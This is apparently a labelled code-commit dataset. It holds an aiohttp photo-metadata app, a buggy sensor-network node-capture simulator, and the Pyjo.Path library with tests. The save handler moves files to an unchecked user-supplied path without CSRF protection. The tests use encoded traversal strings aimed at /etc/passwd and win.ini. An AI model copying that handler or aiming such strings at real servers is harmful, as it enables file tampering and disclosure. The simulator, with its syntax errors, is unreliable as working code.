                ret.append((field, self.get_safe_value(self.meta, field)))
            else:
                ret.append((field, ''))
        return ret


@aiohttp_jinja2.template('index.html')
async def homepage(request):
    # TODO get *.jpeg too
    images = natsorted(
        glob(os.path.join(settings.STORAGE_DIR, '**/*.jpg'), recursive=True),
        key=lambda x: x.upper(),
    )
    return {'images': (Item(x.replace(settings.STORAGE_DIR, '')) for x in images)}


async def save(request):
    # TODO csrf
    data = await request.post()
    item = Item(data['src'])

    # Update name
    new_src = data.get('new_src')
    if new_src and new_src != data['src']:
        # don't need to worry about html unquote
        shutil.move(item.abspath, settings.STORAGE_DIR + new_src)
        old_backup_abspath = item.backup_abspath
        item = Item(new_src)
        if os.path.isfile(old_backup_abspath):
            shutil.move(old_backup_abspath, item.backup_abspath)

    # Update meta
    for field in item.FORM:
        # TODO handle .repeatable (keywords)
        item.meta[field] = [data.get(field, '')]

    if settings.SAVE_ORIGINALS and not os.path.isfile(item.backup_abspath):
        shutil.copyfile(item.abspath, item.backup_abspath)

    # WISHLIST don't write() if nothing changed
    item.meta.write()

    return web.Response(
        status=200,
        body=json.dumps(item.get_form_fields()).encode('utf8'),
        content_type='application/json',
    )


def check_settings(settings):
    """"""
    Raises exception if there's something wrong with the settings.
    """"""
    # TODO make sure STORAGE_DIR is writeable
    return True


def create_app(loop=None):
    if loop is None:
        app = web.Application()
    else:
        app = web.Application(loop=loop)
    app.router.add_static('/images', settings.STORAGE_DIR)
    app.router.add_static('/static', os.path.join(BASE_DIR, 'app'))
    app.router.add_route('GET', '/', homepage)
    app.router.add_route('POST', '/save/', save)
    return app


if __name__ == '__main__':
    check_settings(settings)
    app = create_app()
    aiohttp_jinja2.setup(
        app,
        loader=jinja2.FileSystemLoader(os.path.join(BASE_DIR, 'templates')),
    )
    web.run_app(app)
/n/n/n",1
134,13b6d7f432e0de4beeb8842064bc7122b6510ddc,"network.py/n/n#!/usr/bin/python

import networkx as nx
import random

class Network:
	def __init__(self, size, width, keyPoolSize, keysPerNode, commRange):
		self.G = nx.Graph() 			# Graph of nodes
		self.size = size 				# Number of nodes in graph
		self.width = width 				# Width in meters of sides
		self.keyPoolSize = keyPoolSize 	# Number of keys in total pool
		self.keysPerNode = keysPerNode 	# Number of pools per node
		self.commRange = commRange 		# Range in meters of communication
		# Generate all nodes within the network
		self.genNodes()
		# Add edges for all nodes which are in range of each other
		self.addEdges()
		# Add calculated LKVM values
		self.calcAllLKVM()

	# Calculates all lkvm values and stores them to each node
	def calcAllLKVM(self):
		for edge in self.G.edges():
			self.calcLKVM(edge)

	# Calculates all WLPVM values based on already calculated LKVM and l
	def calcAllWLPVM(self, l):
		for edge in self.G.edges():
			self.calcWLPVM(edge, l)

	# Calculates all TPVM values based on already calculated LKVM and gamma
	def calcAllTPVM(self, gamma):
		for edge in self.G.edges():
			self.calcTPVM(edge, gamma)

	# Calculates lkvm for an edge and stores it to the edge
	def calcLKVM(self, edge):
		i = edge[0]
		j = edge[1]
		iKeys = self.G.nodes(1)[i][1]['keys']
		jKeys = self.G.nodes(1)[j][1]['keys']
		# Find shared keys along edge
		sharedKeys = iKeys.intersection(jKeys)
		# Empty set to keys acquired until same as shared keys
		c = set()
		# lkvm cost to add to
		lkvm = 0
		# Iterate while sharedKeys aren't within c
		while not sharedKeys.issubset(c):
			randNodeIndex = random.randint(0, self.size)
			c.union(self.G.nodes(1)[randNodeIndex][1]['keys'])
			lkvm = lkvm + 1
		self.G[i][j]['lkvm'] = lkvm
		self.G[i][j]['keys'] = sharedKeys



	# Generates the nodes within the network
	def genNodes(self):
		for i in range(self.size - 1):
			self.addNewNode(i)

	# Adds a new node to the graph with random values within parameters
	def addNewNode(self, index):
		x = random.randint(0, self.width)
		y = random.randint(0, self.width)
		keys = set()
		while len(keys) < self.keysPerNode:
			keys.add(random.randint(0, self.keyPoolSize))
		self.G.add_node(index, x = x, y = y, keys = keys)
	
	# Adds edges for all nodes which are in range of each other
	def addEdges(self):
		for node in self.G.nodes(1):
			for otherNode in self.G.nodes():
				# Add edge if not the same node, if there is an edge, and if in range
				if not (node == otherNode) and not self.G.has_edge(node[0], otherNode[0]) and self.inRange(node[1], otherNode[1]):
					self.G.add_edge(node[0], otherNode[0])

	# Returns true if the nodes are in commsRange of each other
	def inRange(self, node1, node2):
		xDistance = node1['x'] - node2['x']
		yDistance = node1['y'] - node2['x']
		distance = math.sqrt(xDistance * xDistance + yDistance * yDistance)
		return distance <= self.commRange


	# Calculates 1 + l / lkvm for edge and stores it into edge attribute
	def calcWLPVM(self, edge, l):
		i = edge[0]
		j = edge[1]
		wlpvm = 1 + 1.0 * l / edge['lkvm']
		self.G[i][j]['wlpvm'] = wlpvm

	# Calculates TPVM for edge and gamma value
	def calcTPVM(self, edge, gamma):
		i = edge[0]
		j = edge[1]
		if edge['lkvm'] < gamma:
			tpvm = 1
		else:
			tpvm = float(""inf"")
		self.G[i][j]['tpvm'] = tpvm/n/n/nsimulation.py/n/n#!/usr/bin/python

import networkx as nx
import random
from network import Network

# first network to test attacks on
N = Network(size=250, width=500, keyPoolSize=1000, keysPerNode=30, commRange=400)

# Try 100 values of gamma for tpvm test
gArray = range(1, 100)
# Resulting array of average hops
gAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
gAvgCapArray = []
for gamma in gArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllTPVM(gamma)
	# We don't want repeated paths, so use a set
	paths = set()
	totalHops = 0;
	# Generate 30 paths
	while len(paths) < 30):
		start = random.randint(0, 250 - 1)
		end = randint.randint(0, 250 - 1)
		# add path find path if start and end are different
		if(start != end)
			shortestPath = nx.shortest_path(N.G, start, end, 'tpvm')
			# add path if not already added. If path is impossible, will cause exception
			if(shortestPath not in paths:
				paths = paths + [shortest_path]
				totalHops = totalHops + len(shortest_path)
	# Average totalHops for the gamma and add to array of averages
	gAvgHopsArray = gAvgHopsArray + [1.0 * totalHops / 30]
	# simulate attack on these paths and add average captures to array
	gAvgCapArray = gAvgCapArray + [simAttack(N.G, paths)]

# Try 100 values of l for wlpvm test
lArray = range(1, 100)
# Resulting array of average hops
lAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
lAvgCapArray = []
for l in lArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllWLPVM(l)
	# We don't want repeated paths, so use a set
	paths = set()
	totalHops = 0;
	# Generate 30 paths
	while len(paths) < 30):
		start = random.randint(0, 250 - 1)
		end = randint.randint(0, 250 - 1)
		# add path find path if start and end are different
		if(start != end)
			shortestPath = nx.shortest_path(N.G, start, end, 'wlpvm')
			# add path if not already added. If path is impossible, will cause exception
			if(shortestPath not in paths:
				paths = paths + [shortest_path]
				totalHops = totalHops + len(shortest_path)
	# Average totalHops for the gamma and add to array of averages
	lAvgHopsArray = lAvgHopsArray + [1.0 * totalHops / 30]
	# simulate attack on these paths and add average captures to array
	lAvgCapArray = lAvgCapArray + [simAttack(N.G, paths)]

# plot retults


# a) find the number of keys per node
N1 = Network(size=100, width=1500, keyPoolSize=1000, keysPerNode=30, commRange=500)

# b) find number of keys per node
N2 = Network(size=1000, width=1000, keyPoolSize=1200, keysPerNode=30, commRange=100)

# Returns the average number of node captures required to each path.
# Does this by selecting a node, compromising its keys, then continuing until
# links are compromised, and then finally a path is compromised.
# paths are uncompromised paths
def simAttack(G, paths):
	# Total number of captures per each compromised path
	totalCaptures = 0;
	# Set of all nodes which have been compromised
	compromisedNodes = set()
	# Set of all keys which have been compromised
	compromisedKeys = set()
	# Compromise more nodes while paths has uncompromised paths
	while len(paths) > 0:
		compromisedNode = random.randint(0, 250 - 1)
		if compromisedNode not in compromisedNodes:
			# add noe to compromised set
			compromisedNodes.add(compromisedNode)
			# add keys from captured node
			compromisedKeys = compromisedKeys.union(G.nodes(1)[compromisedNode][1]['keys'])
			# Iterate through paths to see if any are compromised
			for path in paths:
				# Iterate through edges in path to see if path is compromised
				for i in range(0, len(paths) - 2):
					if compromisedKeys.issuperset(G[i][i + 1]['keys']):
						totalCaptures = totalCaptures + len(compromisedNodes)
						paths.remove(path)
	# Return average number of captures per path
	return 1.0 * totalCaptures / 30


/n/n/n",0
135,13b6d7f432e0de4beeb8842064bc7122b6510ddc,"/network.py/n/n#!/usr/bin/python

import networkx as nx
import random

class Network:
	def __init__(self, size, width, keyPoolSize, keysPerNode, commRange):
		self.G = nx.Graph() 			# Graph of nodes
		self.size = size 				# Number of nodes in graph
		self.width = width 				# Width in meters of sides
		self.keyPoolSize = keyPoolSize 	# Number of keys in total pool
		self.keysPerNode = keysPerNode 	# Number of pools per node
		self.commRange = commRange 		# Range in meters of communication
		# Generate all nodes within the network
		self.genNodes()
		# Add edges for all nodes which are in range of each other
		self.addEdges()
		# Add calculated LKVM values
		self.calcAllLKVM()

	# Calculates all lkvm values and stores them to each node
	def calcAllLKVM(self):
		for edge in self.G.edges():
			self.calcLKVM(edge)

	# Calculates all WLPVM values based on already calculated LKVM and l
	def calcAllWLPVM(self, l):
		for edge in self.G.edges():
			self.calcWLPVM(edge, l)

	# Calculates all TPVM values based on already calculated LKVM and gamma
	def calcAllTPVM(self, gamma):
		for edge in self.G.edges():
			self.calcTPVM(edge, gamma)

	# Calculates lkvm for an edge and stores it to the edge
	def calcLKVM(self, edge):
		i = edge[0]
		j = edge[1]
		iKeys = self.G.nodes(1)[i][1]['keys']
		jKeys = self.G.nodes(1)[j][1]['keys']
		# Find shared keys along edge
		sharedKeys = iKeys.intersection(jKeys)
		# Empty set to keys acquired until same as shared keys
		c = set()
		# lkvm cost to add to
		lkvm = 0
		# Iterate while sharedKeys aren't within c
		while not sharedKeys.issubset(c):
			randNodeIndex = random.randint(0, self.size)
			c.union(self.G.nodes(1)[randNodeIndex][1]['keys'])
			lkvm = lkvm + 1
		self.G[i][j]['lkvm'] = lkvm



	# Generates the nodes within the network
	def genNodes(self):
		for i in range(self.size):
			self.addNewNode(i)

	# Adds a new node to the graph with random values within parameters
	def addNewNode(self, index):
		x = random.randint(0, self.width)
		y = random.randint(0, self.width)
		keys = set()
		while len(keys) < self.keysPerNode:
			keys.add(random.randint(0, self.keyPoolSize))
		self.G.add_node(index, x = x, y = y, keys = keys)
	
	# Adds edges for all nodes which are in range of each other
	def addEdges(self):
		for node in self.G.nodes(1):
			for otherNode in self.G.nodes():
				# Add edge if not the same node, if there is an edge, and if in range
				if not (node == otherNode) and not self.G.has_edge(node[0], otherNode[0]) and self.inRange(node[1], otherNode[1]):
					self.G.add_edge(node[0], otherNode[0])

	# Returns true if the nodes are in commsRange of each other
	def inRange(self, node1, node2):
		xDistance = node1['x'] - node2['x']
		yDistance = node1['y'] - node2['x']
		distance = math.sqrt(xDistance * xDistance + yDistance * yDistance)
		return distance <= self.commRange


	# Calculates 1 + l / lkvm for edge and stores it into edge attribute
	def calcWLPVM(self, edge, l):
		i = edge[0]
		j = edge[1]
		wlpvm = 1 + 1.0 * l / edge['lkvm']
		self.G[i][j]['wlpvm'] = wlpvm

	# Calculates TPVM for edge and gamma value
	def calcTPVM(self, edge, gamma):
		i = edge[0]
		j = edge[1]
		if edge['lkvm'] < gamma:
			tpvm = 1
		else:
			tpvm = float(""inf"")
		self.G[i][j]['tpvm'] = tpvm/n/n/n/simulation.py/n/n#!/usr/bin/python

import networkx as nx
import random
from network import Network

# first network to test attacks on
N = Network(size=250, width=500, keyPoolSize=1000, keysPerNode=30, commRange=400)

# Try 100 values of gamma for tpvm test
gArray = range(100)
# Resulting array of average hops
gAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
gAvgCapArray = []
for gamma in gArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllTPVM(gamma)
	# We don't want repeated paths, so use a set
	paths = set()
	totalHops = 0;
	# Generate 30 paths
	while len(paths) < 30):
		start = random.randint(0, 250)
		end = randint.randint(0, 250)
		# add path find path if start and end are different
		if(start != end)
			shortestPath = nx.shortest_path(N.G, start, end, 'tpvm')
			# add path if not already added. If path is impossible, will cause exception
			if(shortestPath not in paths:
				paths = paths + [shortest_path]
				totalHops = totalHops + len(shortest_path)
	# Average totalHops for the gamma and add to array of averages
	gAvgHopsArray = gAvgHopsArray + [1.0 * totalHops / 30]
	# simulate attack on these paths and add average captures to array
	gAvgCapArray = gAvgCapArray + [simAttack(paths)]

# Try 100 values of l for wlpvm test
lArray = range(100)
# Resulting array of average hops
lAvgHopsArray = []
# Resulting array of average number of captures needed to compromise a path
lAvgCapArray = []
for l in lArray:
	# We use tpvm, so we must calculate it for new value
	N.calcAllWLPVM(l)
	simAttack('wlpvm')

# a) find the number of keys per node
N1 = Network(size=100, width=1500, keyPoolSize=1000, keysPerNode=30, commRange=500)

# b) find number of keys per node
N2 = Network(size=1000, width=1000, keyPoolSize=1200, keysPerNode=30, commRange=100)

# Returns the number of node capt
def simAttack(paths, metric);/n/n/n",1
136,e4b115bc80c41615b2133091af3a74ee5d995c2e,"Pyjo/Path.py/n/n# -*- coding: utf-8 -*-

""""""
Pyjo.Path - Path
================
::

    import Pyjo.Path

    # Parse
    path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')
    print(path[0])

    # Build
    path = Pyjo.Path.new(u'/i/♥')
    path.append('pyjo')
    print(path)

:mod:`Pyjo.Path` is a container for paths used by :mod:`Pyjo.URL` and based on
:rfc:`3986`.
""""""

import Pyjo.Base
import Pyjo.Mixin.String

from Pyjo.Util import b, u, url_escape, url_unescape


class Pyjo_Path(Pyjo.Base.object, Pyjo.Mixin.String.object):
    """"""::

        path = Pyjo.Path.new()
        path = Pyjo.Path.new('/foo%2Fbar%3B/baz.html')

    Construct a new :mod`Pyjo.Path` object and :meth:`parse` path if necessary.
    """"""

    charset = 'utf-8'
    """"""::

        charset = path.charset
        path.charset = 'utf-8'

    Charset used for encoding and decoding, defaults to ``utf-8``. ::

        # Disable encoding and decoding
        path.charset = None
    """"""

    _leading_slash = False
    _path = None
    _parts = None
    _trailing_slash = False

    def __init__(self, path=None):
        super(Pyjo_Path, self).__init__()
        if path is not None:
            self.parse(path)

    def __bool__(self):
        """"""::

            boolean = bool(path)

        Always true. (Python 3.x)
        """"""
        return True

    def __bytes__(self):
        """"""::

            bstring = bytes(path)

        Byte-string representation of an object. (Python 3.x)
        """"""
        return self.to_bytes()

    def __iter__(self):
        """"""::

            parts = list(path)

        Iterator based on :attr:`parts`. Note that this will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons.
        """"""
        return iter(self.parts)

    def __nonzero__(self):
        """"""::

            boolean = bool(path)

        Always true. (Python 2.x)
        """"""
        return True

    def canonicalize(self):
        """"""::

            path = path.canonicalize()

        Canonicalize path by resolving ``.`` and ``..``, in addition ``...`` will be
        treated as ``.`` to protect from path traversal attacks.

            # ""/foo/baz""
            Pyjo.Path.new('/foo/./bar/../baz').canonicalize()

            # ""/../baz""
            Pyjo.Path.new('/foo/../bar/../../baz').canonicalize()

            # ""/foo/bar""
            Pyjo.Path.new('/foo/.../bar').canonicalize()
        """"""
        parts = self.parts
        i = 0
        while i < len(parts):
            if parts[i] == '' or parts[i] == '.' or parts[i] == '...':
                parts.pop(i)
            elif i < 1 or parts[i] != '..' or parts[i - 1] == '..':
                i += 1
            else:
                i -= 1
                parts.pop(i)
                parts.pop(i)

        if not parts:
            self.trailing_slash = False

        return self

    def clone(self):
        """"""::

            clone = path.clone()

        Clone path.
        """"""
        new_obj = type(self)()
        new_obj.charset = self.charset
        if self._parts:
            new_obj._parts = list(self._parts)
            new_obj._leading_slash = self._leading_slash
            new_obj._trailing_slash = self._trailing_slash
        else:
            new_obj._path = self._path
        return new_obj

    def contains(self, prefix):
        """"""::

            boolean = path.contains(u'/i/♥/pyjo')

        Check if path contains given prefix. ::

            # True
            Pyjo.Path.new('/foo/bar').contains('/')
            Pyjo.Path.new('/foo/bar').contains('/foo')
            Pyjo.Path.new('/foo/bar').contains('/foo/bar')

            # False
            Pyjo.Path.new('/foo/bar').contains('/f')
            Pyjo.Path.new('/foo/bar').contains('/bar')
            Pyjo.Path.new('/foo/bar').contains('/whatever')
        """"""
        if prefix == '/':
            return True
        else:
            path = self.to_route()
            return len(path) >= len(prefix) \
                and path.startswith(prefix) \
                and (len(path) == len(prefix) or path[len(prefix)] == '/')

    @property
    def leading_slash(self):
        """"""::

            boolean = path.leading_slash
            path.leading_slash = boolean

        Path has a leading slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """"""
        return self._parse('leading_slash')

    @leading_slash.setter
    def leading_slash(self, value):
        self._parse('leading_slash', value)

    def merge(self, path):
        """"""::

            path = path.merge('/foo/bar')
            path = path.merge('foo/bar')
            path = path.merge(Pyjo.Path.new('foo/bar'))

        Merge paths. Note that this method will normalize both paths if necessary and
        that ``%2F`` will be treated as ``/`` for security reasons. ::

            # ""/baz/yada""
            Pyjo.Path.new('/foo/bar').merge('/baz/yada')

            # ""/foo/baz/yada""
            Pyjo.Path.new('/foo/bar').merge('baz/yada')

            # ""/foo/bar/baz/yada""
            Pyjo.Path.new('/foo/bar/').merge('baz/yada')
        """"""
        # Replace
        if u(path).startswith('/'):
            return self.parse(path)

        # Merge
        if not self.trailing_slash and self.parts:
            self.parts.pop()

        path = self.new(path)
        self.parts += path.parts

        self._trailing_slash = path._trailing_slash

        return self

    def parse(self, path):
        """"""::

            path = path.parse('/foo%2Fbar%3B/baz.html')

        Parse path.
        """"""
        self._path = b(path, self.charset)

        self._parts = None
        self._leading_slash = False
        self._trailing_slash = False

        return self

    @property
    def parts(self):
        """"""::

            parts = path.parts
            path.parts = ['foo', 'bar', 'baz']

        The path parts. Note that this method will normalize the path and that ``%2F``
        will be treated as ``/`` for security reasons. ::

            # Part with slash
            path.parts.append('foo/bar')
        """"""
        return self._parse('parts')

    @parts.setter
    def parts(self, value):
        self._parse('parts', value)

    def to_abs_str(self):
        """"""::

            str = path.to_abs_str()

        Turn path into an absolute string. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_abs_str()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_abs_str()
        """"""
        path = self.to_str()
        if not path.startswith('/'):
            path = '/' + path
        return path

    def to_bytes(self):
        """"""::

            bstring = path.to_bytes()

        Turn path into a bytes string. ::

            # b""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_bytes()

            # b""i/%E2%99%A5/pyjo""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_bytes()
        """"""
        # Path
        charset = self.charset

        if self._path is not None:
            return url_escape(self._path, br'^A-Za-z0-9\-._~!$&\'()*+,;=%:@/')

        if self._parts:
            parts = self._parts
            if charset:
                parts = map(lambda p: p.encode(charset), parts)
            path = b'/'.join(map(lambda p: url_escape(p, br'^A-Za-z0-9\-._~!$&\'()*+,;=:@'), parts))
        else:
            path = b''

        if self._leading_slash:
            path = b'/' + path

        if self._trailing_slash:
            path = path + b'/'

        return path

    def to_dir(self):
        """"""::

            dir = route.to_dir()

        Clone path and remove everything after the right-most slash. ::

            # ""/i/%E2%99%A5/""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_dir()

            # ""i/%E2%99%A5/""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_dir()
        """"""
        clone = self.clone()
        if not clone.trailing_slash:
            clone.parts.pop()
        clone.trailing_slash = bool(clone.parts)
        return clone

    def to_json(self):
        """"""::

            string = path.to_json()

        Turn path into a JSON representation. The same as :meth:`to_str`. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_json()
        """"""
        return self.to_str()

    def to_route(self):
        """"""::

            route = path.to_route()

        Turn path into a route. ::

            # ""/i/♥/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_route()
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_route()
        """"""
        clone = self.clone()
        if clone.charset is None:
            slash = b'/'
        else:
            slash = '/'
        route = slash + slash.join(clone.parts)
        if clone._trailing_slash:
            route += slash
        return route

    def to_str(self):
        """"""::

            string = path.to_str()

        Turn path into a string. ::

            # ""/i/%E2%99%A5/pyjo""
            Pyjo.Path.new('/i/%E2%99%A5/pyjo').to_str()

            # ""i/%E2%99%A5/pyjo""
            Pyjo.Path.new('i/%E2%99%A5/pyjo').to_str()
        """"""
        return self.to_bytes().decode('ascii')

    @property
    def trailing_slash(self):
        """"""::

            boolean = path.trailing_slash
            path.trailing_slash = boolean

        Path has a trailing slash. Note that this method will normalize the path and
        that ``%2F`` will be treated as ``/`` for security reasons.
        """"""
        return self._parse('trailing_slash')

    @trailing_slash.setter
    def trailing_slash(self, value):
        self._parse('trailing_slash', value)

    def _parse(self, name, *args):
        if self._parts is None:
            charset = self.charset

            if self._path is not None:
                path = self._path
            else:
                path = u'' if charset else b''

            if charset:
                path = url_unescape(b(path, charset)).decode(charset)
                slash = u'/'
            else:
                path = url_unescape(path)
                slash = b'/'

            self._path = None

            if path.startswith(slash):
                path = path[1:]
                self._leading_slash = True

            if path.endswith(slash):
                path = path[:-1]
                self._trailing_slash = True

            if path == '':
                self._parts = []
            else:
                self._parts = path.split(slash)

        if not args:
            return getattr(self, '_' + name)

        setattr(self, '_' + name, args[0])


new = Pyjo_Path.new
object = Pyjo_Path  # @ReservedAssignment
/n/n/nt/Pyjo/Path.py/n/n# coding: utf-8

import Pyjo.Test


class NoseTest(Pyjo.Test.NoseTest):
    script = __file__
    srcdir = '../..'


class UnitTest(Pyjo.Test.UnitTest):
    script = __file__


if __name__ == '__main__':

    from Pyjo.Test import *  # @UnusedWildImport

    import Pyjo.Path

    # Basic functionality
    path = Pyjo.Path.new()
    is_ok(str(path.parse('/path')), '/path', 'right path')
    is_ok(str(path.to_dir()), '/', 'right directory')
    is_deeply_ok(path.parts, ['path'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(str(path.parse('path/')), 'path/', 'right path')
    is_ok(str(path.to_dir()), 'path/', 'right directory')
    is_ok(path.to_dir().to_abs_str(), '/path/', 'right directory')
    is_deeply_ok(path.parts, ['path'], 'right structure')
    ok(not path.leading_slash, 'no leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new()
    is_ok(path.to_str(), '', 'no path')
    is_ok(path.to_abs_str(), '/', 'right absolute path')
    is_ok(path.to_route(), '/', 'right route')

    # Advanced
    path = Pyjo.Path.new('/AZaz09-._~!$&\'()*+,;=:@')
    is_ok(path.parts[0], 'AZaz09-._~!$&\'()*+,;=:@', 'right part')
    is_ok(len(path.parts), 1, 'no part')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(str(path), '/AZaz09-._~!$&\'()*+,;=:@', 'right path')
    path.parts.append('f/oo')
    is_ok(str(path), '/AZaz09-._~!$&\'()*+,;=:@/f%2Foo', 'right path')

    # Unicode
    is_ok(str(path.parse(u'/foo/♥/bar')), '/foo/%E2%99%A5/bar', 'right path')
    is_ok(str(path.to_dir()), '/foo/%E2%99%A5/', 'right directory')
    is_deeply_ok(path.parts, ['foo', u'♥', 'bar'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(path.to_route(), u'/foo/♥/bar', 'right route')
    is_ok(str(path.parse('/foo/%E2%99%A5/~b@a:r+')), '/foo/%E2%99%A5/~b@a:r+', 'right path')
    is_deeply_ok(path.parts, ['foo', u'♥', '~b@a:r+'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(path.to_route(), u'/foo/♥/~b@a:r+', 'right route')

    # Zero in path
    is_ok(str(path.parse('/path/0')), '/path/0', 'right path')
    is_deeply_ok(path.parts, ['path', '0'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    path = Pyjo.Path.new('0')
    is_deeply_ok(path.parts, ['0'], 'right structure')
    is_ok(str(path), '0', 'right path')
    is_ok(path.to_abs_str(), '/0', 'right absolute path')
    is_ok(path.to_route(), '/0', 'right route')

    # Canonicalizing
    path = Pyjo.Path.new('/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd')
    is_ok(str(path), '/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', 'same path')
    is_deeply_ok(path.parts, ['', '..', '..', '..', '..', '..', '..', '..', '..', '..', '..', 'etc', 'passwd'], 'right structure')
    is_ok(str(path), '//../../../../../../../../../../etc/passwd', 'normalized path')
    is_ok(str(path.canonicalize()), '/../../../../../../../../../../etc/passwd', 'canonicalized path')
    is_deeply_ok(path.parts, ['..', '..', '..', '..', '..', '..', '..', '..', '..', '..', 'etc', 'passwd'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')

    # Canonicalizing (alternative)
    path = Pyjo.Path.new('%2ftest%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd')
    is_ok(str(path), '%2ftest%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd', 'same path')
    is_deeply_ok(path.parts, ['test', '..', '..', '..', '..', '..', '..', '..', '..', '..', 'etc', 'passwd'], 'right structure')
    is_ok(str(path), '/test/../../../../../../../../../etc/passwd', 'normalized path')
    is_ok(str(path.canonicalize()), '/../../../../../../../../etc/passwd', 'canonicalized path')
    is_deeply_ok(path.parts, ['..', '..', '..', '..', '..', '..', '..', '..', 'etc', 'passwd'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')

    # Canonicalize (triple dot)
    path = Pyjo.Path.new('/foo/.../.../windows/win.ini');
    is_ok(str(path), '/foo/.../.../windows/win.ini', 'same path')
    is_deeply_ok(path.parts, ['foo', '...', '...', 'windows', 'win.ini'], 'right structure')
    is_ok(path.canonicalize(), '/foo/windows/win.ini', 'canonicalized path')
    is_deeply_ok(path.parts, ['foo', 'windows', 'win.ini'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')

    # Canonicalizing (with escaped ""%"")
    path = Pyjo.Path.new('%2ftest%2f..%252f..%2f..%2f..%2f..%2fetc%2fpasswd')
    is_ok(str(path), '%2ftest%2f..%252f..%2f..%2f..%2f..%2fetc%2fpasswd', 'same path')
    is_deeply_ok(path.parts, ['test', '..%2f..', '..', '..', '..', 'etc', 'passwd'], 'right structure')
    is_ok(str(path), '/test/..%252f../../../../etc/passwd', 'normalized path')
    is_ok(str(path.canonicalize()), '/../etc/passwd', 'canonicalized path')
    is_deeply_ok(path.parts, ['..', 'etc', 'passwd'], 'right structure')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')

    # Contains
    path = Pyjo.Path.new('/foo/bar')
    ok(path.contains('/'), 'contains path')
    ok(path.contains('/foo'), 'contains path')
    ok(path.contains('/foo/bar'), 'contains path')
    ok(not path.contains('/foobar'), 'does not contain path')
    ok(not path.contains('/foo/b'), 'does not contain path')
    ok(not path.contains('/foo/bar/baz'), 'does not contain path')
    path = Pyjo.Path.new(u'/♥/bar')
    ok(path.contains(u'/♥'), 'contains path')
    ok(path.contains(u'/♥/bar'), 'contains path')
    ok(not path.contains(u'/♥foo'), 'does not contain path')
    ok(not path.contains(u'/foo♥'), 'does not contain path')
    path = Pyjo.Path.new('/')
    ok(path.contains('/'), 'contains path')
    ok(not path.contains('/foo'), 'does not contain path')
    path = Pyjo.Path.new('/0')
    ok(path.contains('/'), 'contains path')
    ok(path.contains('/0'), 'contains path')
    ok(not path.contains('/0/0'), 'does not contain path')
    path = Pyjo.Path.new(u'/0/♥.html')
    ok(path.contains('/'), 'contains path')
    ok(path.contains('/0'), 'contains path')
    ok(path.contains(u'/0/♥.html'), 'contains path')
    ok(not path.contains(u'/0/♥'), 'does not contain path')
    ok(not path.contains(u'/0/0.html'), 'does not contain path')
    ok(not path.contains('/0.html'), 'does not contain path')
    ok(not path.contains(u'/♥.html'), 'does not contain path')

    # Merge
    path = Pyjo.Path.new('/foo')
    path.merge('bar/baz')
    is_ok(str(path), '/bar/baz', 'right path')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    path = Pyjo.Path.new('/foo/')
    path.merge('bar/baz')
    is_ok(str(path), '/foo/bar/baz', 'right path')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    path = Pyjo.Path.new('/foo/')
    path.merge('bar/baz/')
    is_ok(str(path), '/foo/bar/baz/', 'right path')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    path = Pyjo.Path.new('/foo/')
    path.merge('/bar/baz')
    is_ok(str(path), '/bar/baz', 'right path')
    ok(path.leading_slash, 'has leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(path.to_route(), '/bar/baz', 'right route')
    path = Pyjo.Path.new('/foo/bar')
    path.merge('/bar/baz/')
    is_ok(str(path), '/bar/baz/', 'right path')
    ok(path.leading_slash, 'has leading slash')
    ok(path.trailing_slash, 'has trailing slash')
    is_ok(path.to_route(), '/bar/baz/', 'right route')
    path = Pyjo.Path.new('foo/bar')
    path.merge('baz/yada')
    is_ok(str(path), 'foo/baz/yada', 'right path')
    ok(not path.leading_slash, 'no leading slash')
    ok(not path.trailing_slash, 'no trailing slash')
    is_ok(path.to_route(), '/foo/baz/yada', 'right route')

    # Empty path elements
    path = Pyjo.Path.new('//')
    is_ok(str(path), '//', 'right path')
